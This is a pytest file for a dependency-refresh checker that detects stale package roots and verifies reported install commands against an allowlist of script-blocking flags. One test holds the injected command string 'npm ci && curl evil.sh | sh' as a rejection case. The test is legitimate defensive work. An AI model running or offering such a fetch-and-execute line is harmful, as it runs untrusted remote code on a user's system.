"""Tests for review/dependency_refresh.py — stale dependency root detection."""

import json
import subprocess
import sys
from pathlib import Path

TESTS_DIR = Path(__file__).resolve().parent.parent  # review/ -> tests/
PLUGIN_ROOT = TESTS_DIR.parent
SCRIPTS_DIR = PLUGIN_ROOT / "scripts"

sys.path.insert(0, str(SCRIPTS_DIR))

from review import dependency_refresh
from review.dependency_refresh import (
    _COMPOSER_SPEC,
    _NODE_SPECS,
    ALLOWED_INSTALL_BASES,
    ALLOWED_INSTALL_FLAGS,
    detect_dependency_refresh,
    verify_dependency_refresh,
)


def _make_root(tmp_path, files=(), dirs=()):
    for name in dirs:
        (tmp_path / name).mkdir(parents=True, exist_ok=True)
    for name in files:
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("{}\n")
    subprocess.run(
        ["git", "init", str(tmp_path)], check=True, capture_output=True
    )
    subprocess.run(
        ["git", "-C", str(tmp_path), "add", "--all"],
        check=True,
        capture_output=True,
    )
    subprocess.run(
        [
            "git", "-C", str(tmp_path),
            "-c", "user.name=Dependency Refresh Test",
            "-c", "user.email=dependency-refresh@example.com",
            "commit", "--allow-empty", "-m", "Initial dependency state",
        ],
        check=True,
        capture_output=True,
    )
    return tmp_path


class TestComposerDetection:
    def test_changed_lockfile_signals_refresh(self, tmp_path):
        root = _make_root(tmp_path,
                          files=("composer.json", "composer.lock"),
                          dirs=("vendor",))
        result = detect_dependency_refresh(str(root), ["composer.lock"])
        assert len(result["signals"]) == 1
        signal = result["signals"][0]
        assert signal["manager"] == "composer"
        assert signal["directory"] == "."
        assert signal["reasons"] == ["changed_in_range"]
        assert signal["changed_files"] == ["composer.lock"]
        assert signal["installed_state_present"] is True
        assert signal["suggested_command"] == \
            "composer install --no-scripts --no-plugins --prefer-dist --no-interaction"

    def test_missing_vendor_signals_even_without_range_change(self, tmp_path):
        root = _make_root(tmp_path, files=("composer.json", "composer.lock"))
        result = detect_dependency_refresh(str(root), ["src/main.php"])
        assert len(result["signals"]) == 1
        signal = result["signals"][0]
        assert signal["reasons"] == ["installed_state_missing"]
        assert signal["installed_state_present"] is False

    def test_both_reasons_are_reported_when_both_hold(self, tmp_path):
        """_signal appends independently, so a changed lockfile on a root
        that also has no installed state must carry BOTH reasons in order.
        The single-reason tests above each pass while the other reason is
        silently dropped; only this one reads the accumulated list."""
        root = _make_root(tmp_path, files=("composer.json", "composer.lock"))

        result = detect_dependency_refresh(str(root), ["composer.lock"])

        assert len(result["signals"]) == 1
        signal = result["signals"][0]
        assert signal["reasons"] == ["changed_in_range", "installed_state_missing"]
        assert signal["installed_state_present"] is False

    def test_fresh_installed_state_and_untouched_manifests_stay_silent(self, tmp_path):
        root = _make_root(tmp_path,
                          files=("composer.json", "composer.lock"),
                          dirs=("vendor",))
        result = detect_dependency_refresh(str(root), ["src/main.php"])
        assert result["signals"] == []

    def test_manifest_without_lockfile_never_signals(self, tmp_path):
        # No lockfile means no frozen-mode install is possible.
        root = _make_root(tmp_path, files=("composer.json",))
        result = detect_dependency_refresh(str(root), ["composer.json"])
        assert result["signals"] == []


class TestNodeManagerPriority:
    def test_pnpm_lockfile_wins_over_npm(self, tmp_path):
        root = _make_root(
            tmp_path,
            files=("package.json", "pnpm-lock.yaml", "package-lock.json"),
        )
        result = detect_dependency_refresh(str(root), ["pnpm-lock.yaml"])
        managers = [s["manager"] for s in result["signals"]]
        assert managers == ["pnpm"]
        assert result["signals"][0]["suggested_command"] == \
            "pnpm install --frozen-lockfile --ignore-scripts"

    def test_yarn_lockfile_detected(self, tmp_path):
        root = _make_root(tmp_path, files=("package.json", "yarn.lock"))
        result = detect_dependency_refresh(str(root), ["yarn.lock"])
        assert result["signals"][0]["manager"] == "yarn"
        assert result["signals"][0]["suggested_command"] == \
            "yarn install --immutable --mode=skip-build"

    def test_npm_lockfile_detected(self, tmp_path):
        root = _make_root(tmp_path, files=("package.json", "package-lock.json"))
        result = detect_dependency_refresh(str(root), ["package-lock.json"])
        assert result["signals"][0]["manager"] == "npm"
        assert result["signals"][0]["suggested_command"] == \
            "npm ci --ignore-scripts --no-audit --no-fund"


def test_suggested_commands_block_scripts_as_defense_in_depth():
    # Script-blocking flags are defense-in-depth; command verification is the gate.
    node_commands = {
        spec["manager"]: spec["suggested_command"] for spec in _NODE_SPECS
    }

    assert node_commands == {
        "npm": "npm ci --ignore-scripts --no-audit --no-fund",
        "pnpm": "pnpm install --frozen-lockfile --ignore-scripts",
        "yarn": "yarn install --immutable --mode=skip-build",
    }
    assert _COMPOSER_SPEC["suggested_command"] == \
        "composer install --no-scripts --no-plugins --prefer-dist --no-interaction"
    assert ALLOWED_INSTALL_BASES == (
        ("composer", "install"),
        ("npm", "ci"),
        ("pnpm", "install"),
        ("yarn", "install"),
    )
    assert ALLOWED_INSTALL_FLAGS == frozenset({
        "--ignore-scripts", "--no-scripts", "--no-plugins", "--prefer-dist",
        "--no-interaction", "--no-audit", "--no-fund", "--frozen-lockfile",
        "--immutable", "--mode=skip-build",
    })


class TestNestedRoots:
    def test_changed_nested_manifest_signals_its_directory(self, tmp_path):
        root = _make_root(
            tmp_path,
            files=("packages/app/package.json", "packages/app/package-lock.json"),
        )
        result = detect_dependency_refresh(
            str(root), ["packages/app/package-lock.json"]
        )
        assert len(result["signals"]) == 1
        assert result["signals"][0]["directory"] == "packages/app"

    def test_untouched_nested_root_is_not_scanned(self, tmp_path):
        # Bounded detection: nested roots enter only via changed manifest files.
        root = _make_root(
            tmp_path,
            files=("packages/app/package.json", "packages/app/package-lock.json"),
        )
        result = detect_dependency_refresh(str(root), ["src/index.js"])
        assert result["signals"] == []

    def test_composer_and_node_can_both_signal(self, tmp_path):
        root = _make_root(
            tmp_path,
            files=("composer.json", "composer.lock",
                   "package.json", "package-lock.json"),
        )
        result = detect_dependency_refresh(
            str(root), ["composer.lock", "package-lock.json"]
        )
        managers = sorted(s["manager"] for s in result["signals"])
        assert managers == ["composer", "npm"]


class TestPathSafety:
    def test_traversal_directories_are_skipped(self, tmp_path):
        root = _make_root(tmp_path, files=("composer.json", "composer.lock"),
                          dirs=("vendor",))
        result = detect_dependency_refresh(
            str(root), ["../outside/composer.lock", "/abs/composer.lock"]
        )
        assert result["signals"] == []

    def test_malformed_git_quoted_paths_are_skipped(self, tmp_path):
        root = _make_root(tmp_path, files=("composer.json", "composer.lock"),
                          dirs=("vendor",))
        # Malformed C-quoted wrapper (unterminated escape) — decoder rejects.
        result = detect_dependency_refresh(str(root), ['"composer.loc\\'])
        assert result["signals"] == []

    def test_successfully_decoded_quoted_manifest_signals(self, tmp_path):
        """A ``(decoded, True)`` result is a successful quoted decode."""
        dep_dir = tmp_path / "café"
        dep_dir.mkdir()
        (dep_dir / "composer.json").write_text("{}")
        (dep_dir / "composer.lock").write_text("{}")
        subprocess.run(
            ["git", "init", str(tmp_path)], check=True, capture_output=True
        )
        subprocess.run(
            ["git", "-C", str(tmp_path), "add", "--all"],
            check=True,
            capture_output=True,
        )
        subprocess.run(
            [
                "git", "-C", str(tmp_path),
                "-c", "user.name=Dependency Refresh Test",
                "-c", "user.email=dependency-refresh@example.com",
                "commit", "-m", "Initial dependency state",
            ],
            check=True,
            capture_output=True,
        )

        result = detect_dependency_refresh(
            str(tmp_path), ['"caf\\303\\251/composer.json"']
        )

        signals = result["signals"]
        assert len(signals) == 1
        assert signals[0]["manager"] == "composer"
        assert signals[0]["directory"] == "café"

    def test_non_string_and_empty_entries_are_skipped(self, tmp_path):
        root = _make_root(tmp_path, files=("composer.json", "composer.lock"),
                          dirs=("vendor",))
        result = detect_dependency_refresh(str(root), [None, "", 42])
        assert result["signals"] == []

    def test_signals_are_deterministically_ordered(self, tmp_path):
        root = _make_root(
            tmp_path,
            files=("b/composer.json", "b/composer.lock",
                   "a/composer.json", "a/composer.lock"),
        )
        result = detect_dependency_refresh(
            str(root), ["b/composer.lock", "a/composer.lock"]
        )
        assert [s["directory"] for s in result["signals"]] == ["a", "b"]


class TestDetectionWorktreePrecondition:
    @staticmethod
    def _repo_with_composer_root_and_submodule(tmp_path):
        parent, submodule = TestVerifyDependencyRefresh._init_repo_with_submodule(
            tmp_path
        )
        (parent / "composer.json").write_text("{}\n")
        (parent / "composer.lock").write_text("{}\n")
        subprocess.run(
            ["git", "-C", str(parent), "add", "composer.json", "composer.lock"],
            check=True,
            capture_output=True,
        )
        subprocess.run(
            [
                "git", "-C", str(parent),
                "-c", "user.name=Dependency Refresh Test",
                "-c", "user.email=dependency-refresh@example.com",
                "commit", "-m", "Add dependency manifests",
            ],
            check=True,
            capture_output=True,
        )
        return parent, submodule

    def test_dirty_tracked_worktree_skips_but_preserves_signals(self, tmp_path):
        root = _make_root(
            tmp_path,
            files=("composer.json", "composer.lock"),
            dirs=("vendor",),
        )
        (root / "composer.lock").write_text('{"dirty": true}\n')

        result = detect_dependency_refresh(str(root), ["composer.lock"])

        assert len(result["signals"]) == 1
        assert result["skipped_reason"] == "dirty_worktree"
        assert result["dirty_files"] == ["composer.lock"]

    def test_untracked_only_files_do_not_skip_refresh(self, tmp_path):
        root = _make_root(
            tmp_path,
            files=("composer.json", "composer.lock"),
            dirs=("vendor",),
        )
        (root / "scratch.txt").write_text("untracked\n")

        result = detect_dependency_refresh(str(root), ["composer.lock"])

        assert len(result["signals"]) == 1
        assert "skipped_reason" not in result

    def test_dirty_worktree_without_stale_roots_remains_a_noop(self, tmp_path):
        root = _make_root(
            tmp_path,
            files=("composer.json", "composer.lock", "tracked.txt"),
            dirs=("vendor",),
        )
        (root / "tracked.txt").write_text("dirty\n")

        result = detect_dependency_refresh(str(root), ["src/main.php"])

        assert result == {"signals": []}

    def test_dirty_file_evidence_is_bounded(self, tmp_path):
        tracked_files = tuple(f"tracked-{index:02d}.txt" for index in range(25))
        root = _make_root(
            tmp_path,
            files=("composer.json", "composer.lock", *tracked_files),
            dirs=("vendor",),
        )
        for filename in tracked_files:
            (root / filename).write_text("dirty\n")

        result = detect_dependency_refresh(str(root), ["composer.lock"])

        assert result["skipped_reason"] == "dirty_worktree"
        assert len(result["dirty_files"]) == 20
        assert result["dirty_files"] == list(tracked_files[:20])

    def test_tracked_submodule_changes_skip_refresh(self, tmp_path):
        parent, submodule = self._repo_with_composer_root_and_submodule(tmp_path)
        (submodule / "tracked.txt").write_text("mutated\n", encoding="utf-8")

        result = detect_dependency_refresh(str(parent), ["composer.lock"])

        assert result["skipped_reason"] == "dirty_worktree"
        assert result["dirty_files"] == ["dependency"]

    def test_gitmodules_ignore_all_cannot_hide_tracked_submodule_changes(
        self, tmp_path
    ):
        parent, submodule = self._repo_with_composer_root_and_submodule(tmp_path)
        subprocess.run(
            [
                "git", "-C", str(parent), "config", "-f", ".gitmodules",
                "submodule.dependency.ignore", "all",
            ],
            check=True,
            capture_output=True,
        )
        subprocess.run(
            ["git", "-C", str(parent), "add", ".gitmodules"],
            check=True,
            capture_output=True,
        )
        subprocess.run(
            [
                "git", "-C", str(parent),
                "-c", "user.name=Dependency Refresh Test",
                "-c", "user.email=dependency-refresh@example.com",
                "commit", "-m", "Ignore dependency dirtiness",
            ],
            check=True,
            capture_output=True,
        )
        (submodule / "tracked.txt").write_text("mutated\n", encoding="utf-8")

        result = detect_dependency_refresh(str(parent), ["composer.lock"])

        assert result["skipped_reason"] == "dirty_worktree"
        assert result["dirty_files"] == ["dependency"]

    def test_nonzero_git_status_fails_closed(self, tmp_path, monkeypatch):
        root = _make_root(
            tmp_path,
            files=("composer.json", "composer.lock"),
            dirs=("vendor",),
        )

        def fail_status(*args, **kwargs):
            return subprocess.CompletedProcess(args, 1, stdout="", stderr="broken")

        monkeypatch.setattr(dependency_refresh.subprocess, "run", fail_status)

        result = detect_dependency_refresh(str(root), ["composer.lock"])

        assert len(result["signals"]) == 1
        assert result["skipped_reason"] == "worktree_status_failed"
        assert result["dirty_files"] == []

    def test_git_status_timeout_fails_closed(self, tmp_path, monkeypatch):
        root = _make_root(
            tmp_path,
            files=("composer.json", "composer.lock"),
            dirs=("vendor",),
        )

        def timeout_status(*args, **kwargs):
            raise subprocess.TimeoutExpired(cmd=args[0], timeout=30)

        monkeypatch.setattr(dependency_refresh.subprocess, "run", timeout_status)

        result = detect_dependency_refresh(str(root), ["composer.lock"])

        assert len(result["signals"]) == 1
        assert result["skipped_reason"] == "worktree_status_failed"
        assert result["dirty_files"] == []


class TestLoadDependencyRefreshReport:
    def test_unreadable_report_is_a_load_failure(self, tmp_path):
        (tmp_path / "dependency-refresh.json").mkdir()

        report, load_failed = dependency_refresh.load_dependency_refresh_report(
            tmp_path
        )

        assert report is None
        assert load_failed is True


class TestVerifyDependencyRefresh:
    _RESULT_KEYS = {
        "report_present",
        "commands_allowed",
        "disallowed_commands",
        "tracked_files_dirty",
        "dirty_files",
        "verification_failed",
    }

    @staticmethod
    def _write_report(output_dir, commands):
        report = {
            "status": "ok",
            "commands": [
                {"directory": ".", "command": command, "exit_status": "ok"}
                for command in commands
            ],
            "tracked_files_dirty": False,
        }
        TestVerifyDependencyRefresh._write_report_payload(output_dir, report)

    @staticmethod
    def _write_report_payload(output_dir, report):
        output_dir.mkdir(parents=True, exist_ok=True)
        (output_dir / "dependency-refresh.json").write_text(
            json.dumps(report), encoding="utf-8"
        )

    @staticmethod
    def _write_raw_report(output_dir, report_text):
        output_dir.mkdir(parents=True, exist_ok=True)
        (output_dir / "dependency-refresh.json").write_text(
            report_text, encoding="utf-8"
        )

    @classmethod
    def _assert_unknown_report_failure(cls, result, report_present):
        assert set(result) == cls._RESULT_KEYS
        assert result["report_present"] is report_present
        assert result["commands_allowed"] is None
        assert result["tracked_files_dirty"] is False
        assert result["verification_failed"] is True

    @staticmethod
    def _init_repo(repo):
        repo.mkdir()
        subprocess.run(["git", "init", str(repo)], check=True, capture_output=True)
        (repo / "tracked.txt").write_text("initial\n", encoding="utf-8")
        subprocess.run(
            ["git", "-C", str(repo), "add", "tracked.txt"],
            check=True,
            capture_output=True,
        )
        subprocess.run(
            [
                "git", "-C", str(repo),
                "-c", "user.name=Dependency Refresh Test",
                "-c", "user.email=dependency-refresh@example.com",
                "commit", "-m", "Initial commit",
            ],
            check=True,
            capture_output=True,
        )

    @classmethod
    def _init_repo_with_submodule(cls, tmp_path):
        child = tmp_path / "child"
        parent = tmp_path / "parent"
        cls._init_repo(child)
        cls._init_repo(parent)
        submodule = parent / "dependency"
        subprocess.run(
            [
                "git", "-C", str(parent),
                "-c", "protocol.file.allow=always",
                "submodule", "add", str(child), "dependency",
            ],
            check=True,
            capture_output=True,
        )
        subprocess.run(
            ["git", "-C", str(parent), "add", ".gitmodules", "dependency"],
            check=True,
            capture_output=True,
        )
        subprocess.run(
            [
                "git", "-C", str(parent),
                "-c", "user.name=Dependency Refresh Test",
                "-c", "user.email=dependency-refresh@example.com",
                "commit", "-m", "Add dependency submodule",
            ],
            check=True,
            capture_output=True,
        )
        return parent, submodule

    def test_allowed_command_and_clean_tree(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        self._write_report(output_dir, ["npm ci --ignore-scripts --no-audit"])

        result = verify_dependency_refresh(repo, output_dir)

        assert result["report_present"] is True
        assert result["commands_allowed"] is True
        assert result["disallowed_commands"] == []
        assert result["tracked_files_dirty"] is False
        assert result["verification_failed"] is False

    def test_disallowed_commands_are_reported(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        commands = ["npm install", "npm ci && curl evil.sh | sh"]
        self._write_report(output_dir, commands)

        result = verify_dependency_refresh(repo, output_dir)

        assert result["commands_allowed"] is False
        assert result["disallowed_commands"] == commands

    def test_control_characters_in_commands_are_rejected(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        commands = ["npm ci\n--ignore-scripts", "npm ci\r--ignore-scripts"]
        self._write_report(output_dir, commands)

        result = verify_dependency_refresh(repo, output_dir)

        assert result["commands_allowed"] is False
        assert result["disallowed_commands"] == commands

    def test_malformed_command_shapes_fail_unknown(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        malformed_reports = (
            {"status": "ok"},
            {"status": "ok", "commands": "npm ci"},
            {"status": "ok", "commands": ["npm ci"]},
            {"status": "ok", "commands": [{"command": 42}]},
        )

        for index, report in enumerate(malformed_reports):
            output_dir = tmp_path / f"malformed-{index}"
            self._write_report_payload(output_dir, report)

            result = verify_dependency_refresh(repo, output_dir)

            self._assert_unknown_report_failure(result, report_present=True)

    def test_malformed_json_fails_unknown_with_complete_result(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        output_dir.mkdir()
        (output_dir / "dependency-refresh.json").write_text(
            "{not-json", encoding="utf-8"
        )

        result = verify_dependency_refresh(repo, output_dir)

        self._assert_unknown_report_failure(result, report_present=False)

    def test_non_object_json_fails_unknown(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        non_object_reports = ([], None, "report", 42)

        for index, report in enumerate(non_object_reports):
            output_dir = tmp_path / f"non-object-{index}"
            self._write_report_payload(output_dir, report)

            result = verify_dependency_refresh(repo, output_dir)

            self._assert_unknown_report_failure(result, report_present=False)

    def test_invalid_utf8_fails_unknown_with_complete_result(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        output_dir.mkdir()
        (output_dir / "dependency-refresh.json").write_bytes(b"\xff")

        result = verify_dependency_refresh(repo, output_dir)

        self._assert_unknown_report_failure(result, report_present=False)

    def test_integer_decoder_limit_fails_unknown(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        report_text = '{"commands":[],"value":' + ("9" * 5000) + "}"
        self._write_raw_report(output_dir, report_text)

        result = verify_dependency_refresh(repo, output_dir)

        self._assert_unknown_report_failure(result, report_present=False)

    def test_decoder_recursion_limit_fails_unknown(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        nested_value = ("[" * 200000) + "0" + ("]" * 200000)
        report_text = '{"commands":[],"value":' + nested_value + "}"
        self._write_raw_report(output_dir, report_text)

        result = verify_dependency_refresh(repo, output_dir)

        self._assert_unknown_report_failure(result, report_present=False)

    def test_oversized_report_fails_unknown(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        self._write_report_payload(
            output_dir,
            {"commands": [], "padding": "x" * (1024 * 1024)},
        )

        result = verify_dependency_refresh(repo, output_dir)

        self._assert_unknown_report_failure(result, report_present=False)

    def test_too_many_reported_commands_fail_unknown(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        self._write_report(output_dir, ["npm ci"] * 129)

        result = verify_dependency_refresh(repo, output_dir)

        self._assert_unknown_report_failure(result, report_present=True)

    def test_dirty_tracked_file_is_reported(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        self._write_report(output_dir, ["composer install --no-scripts"])
        (repo / "tracked.txt").write_text("mutated\n", encoding="utf-8")

        result = verify_dependency_refresh(repo, output_dir)

        assert result["tracked_files_dirty"] is True
        assert result["dirty_files"] == ["tracked.txt"]

    def test_untracked_file_inside_submodule_is_ignored(self, tmp_path):
        repo, submodule = self._init_repo_with_submodule(tmp_path)
        output_dir = tmp_path / "output"
        self._write_report(output_dir, [])
        (submodule / "untracked.txt").write_text("untracked\n", encoding="utf-8")

        result = verify_dependency_refresh(repo, output_dir)

        assert result["tracked_files_dirty"] is False
        assert result["dirty_files"] == []

    def test_tracked_file_inside_submodule_remains_dirty(self, tmp_path):
        repo, submodule = self._init_repo_with_submodule(tmp_path)
        output_dir = tmp_path / "output"
        self._write_report(output_dir, [])
        (submodule / "tracked.txt").write_text("mutated\n", encoding="utf-8")

        result = verify_dependency_refresh(repo, output_dir)

        assert result["tracked_files_dirty"] is True
        assert result["dirty_files"] == ["dependency"]

    def test_missing_report_never_claims_commands_are_clean(self, tmp_path):
        repo = tmp_path / "repo"
        self._init_repo(repo)

        result = verify_dependency_refresh(repo, tmp_path / "missing-output")

        assert result["report_present"] is False
        assert result["commands_allowed"] is None
        assert result["verification_failed"] is False

    def test_git_failure_reports_unknown_tracked_state(self, tmp_path, monkeypatch):
        repo = tmp_path / "not-a-repo"
        repo.mkdir()
        output_dir = tmp_path / "output"
        self._write_report(output_dir, ["npm ci --ignore-scripts"])
        monkeypatch.setenv("GIT_CEILING_DIRECTORIES", str(tmp_path))

        result = verify_dependency_refresh(repo, output_dir)

        assert result["verification_failed"] is True
        assert result["tracked_files_dirty"] is None

    def test_git_stdout_decode_failure_preserves_report_evidence(
        self, tmp_path, monkeypatch
    ):
        repo = tmp_path / "repo"
        self._init_repo(repo)
        output_dir = tmp_path / "output"
        self._write_report(output_dir, [])

        def raise_decode_error(*_args, **_kwargs):
            raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte")

        monkeypatch.setattr(
            "review.dependency_refresh.subprocess.run", raise_decode_error
        )

        result = verify_dependency_refresh(repo, output_dir)

        assert set(result) == self._RESULT_KEYS
        assert result["report_present"] is True
        assert result["commands_allowed"] is True
        assert result["tracked_files_dirty"] is None
        assert result["dirty_files"] == []
        assert result["verification_failed"] is True
